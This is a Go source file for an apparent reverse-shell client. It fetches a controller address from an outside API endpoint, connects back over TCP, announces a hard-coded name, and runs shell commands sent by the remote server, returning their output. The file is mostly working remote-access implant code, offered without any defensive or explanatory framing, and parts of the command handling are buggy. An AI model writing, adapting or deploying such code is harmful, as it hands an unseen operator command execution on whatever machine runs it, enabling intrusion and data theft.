package main

// client file
import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

type ServerAddr struct {
	Address string `json:"address"`
	Port    int `json:"port"`
	Status  bool `json:"status"`
}

// type msg struct {
// 	val string
// }
  
type Client struct {
	status      bool
	apiendpoint string
	addr        string
	port        int
	quitc       chan struct{}
	inp         chan string
	out         chan string
	name string
	idle bool
}

func newClient(apiendpoint string, name string) *Client {
	return &Client{
		status:      false,
		apiendpoint: apiendpoint,
		name: name,
		idle: false,
	}
}

func (c *Client) Update() error {
	for {
		client := &http.Client{
			Timeout: 10 * time.Second,
		}
		req, err := http.NewRequest("GET", c.apiendpoint, nil)

		if err != nil {
			fmt.Println("Error Creating request ( to api ): ", err);
			return err;
		}

		// req.Header.Set("User-Agent", "DynamoClient/1.0")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error connecting to api for url: ", err)
			time.Sleep(2000 * time.Millisecond)
			fmt.Println("Retrying to connect to api !")
			continue;
		}
		defer resp.Body.Close()

		// defer req.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading req. body of api request: ", err)
			continue
		}
		fmt.Println(string(body))
		var saddr ServerAddr
		json.Unmarshal(body[1:len(body)-1], &saddr)
		c.addr = saddr.Address
		c.port = saddr.Port
		c.status = saddr.Status
		fmt.Printf("GOT SERVER ADDRESS: %s %d %t\n", c.addr, c.port, c.status);
		if !c.status {
			time.Sleep(10 * time.Second)
			continue
		}
		// fmt.Println("HERE!")
		// resp.Body.Close()
		break
	}
	return nil
}

// this go routine just fetches any data from server and adds it to 'inp' channel.
func (c *Client) getInp(conn net.Conn) error {
	buffer := make([]byte, 2048)
	n, err := conn.Read(buffer)
	if (err == io.EOF){
		c.idle = false;
		c.quitc <- struct{}{}
		return err;
	}
	fmt.Printf("Got %d bytes from server !\n", n)
	if (err != nil){
		c.idle = false;
		c.quitc <- struct{}{}
		fmt.Println("Server read error: ", err);
		return err;
	}
	if (c.idle){c.inp <- string(buffer);}
	return nil
}

// this go routine just sends any data to the server from 'out' channel.
func (c *Client) sendOutput(conn net.Conn) error {
	for outbuff := range c.out {
		fmt.Println("sending ", outbuff, " which is ", string(outbuff));
		_, err := conn.Write([]byte(outbuff));
		if (err != nil){
			fmt.Println("Server write error: ", err);
			c.idle = false;
			c.quitc <- struct{}{};
			return err
		}
	}
	return nil
}

func (c *Client) terminal(args []string){
	// for (c.idle) {
	// c.out <- "Terminal starting...";
	// args := strings.Split(<-c.inp, " ");
	// if (args[0] == "exit" || args[0] == "quit"){
	// 	c.out <- "\nClosing Terminal...\n";
	// 	break;
	// }

	cmd := exec.Command(strings.Join(args, " "))
	// cmd.Stdin = 
	var outbuff, errbuff bytes.Buffer;
	cmd.Stdout = &outbuff
	cmd.Stderr = &errbuff
	err := cmd.Run()
	if err != nil {
		c.out <- fmt.Sprintf("Error: %s\n", err);
	}else{
		c.out <- outbuff.String();
	}
	// }
}

func (c *Client) logic() error {
	fmt.Println("got here !");
	for (c.idle){
		args := strings.Split(<-c.inp, " ");
		switch args[0] {
			case "cmd":
				c.terminal(args[1:]);
				break;
			default:
				c.out <- fmt.Sprintf("Unknown Command: <%s>", string(args[0]));
		}
	}
	return nil;
}

func (c *Client) mainloop() error {
	// establish connection with server
	fmt.Println("Started to call to server...");
	c.idle = false;
	conn, err := net.Dial("tcp", c.addr + ":" + strconv.Itoa(c.port))
	if err != nil {
		fmt.Println("Error connecting to server: ", err, "\nRetrying...");
		return err;
	}
	defer conn.Close()

	c.idle = true;
	go c.sendOutput(conn);
	fmt.Println("Connection Established with remote server " + conn.RemoteAddr().String());
	c.out <- c.name;
	fmt.Println("Sent name:", c.name, "to server !");
	// go func (){
	// 	for cinp := range c.inp {
	// 		fmt.Println("Message from Server: ", cinp);

	// 	}
	// }()
	go c.logic();
	go func (){
		for (c.idle){
			c.getInp(conn);
		}
	}()
	<-c.quitc;
	fmt.Print()
	return nil;
}

func (c *Client) Reach() {
	c.quitc = make(chan struct{})
	c.inp = make(chan string)
	c.out = make(chan string)
	c.Update()
	c.mainloop()
}

func main() {
	for {
		newClient("https://aryansapi.vercel.app/api/dynamo", "Anuj Gupta").Reach()
	}
}
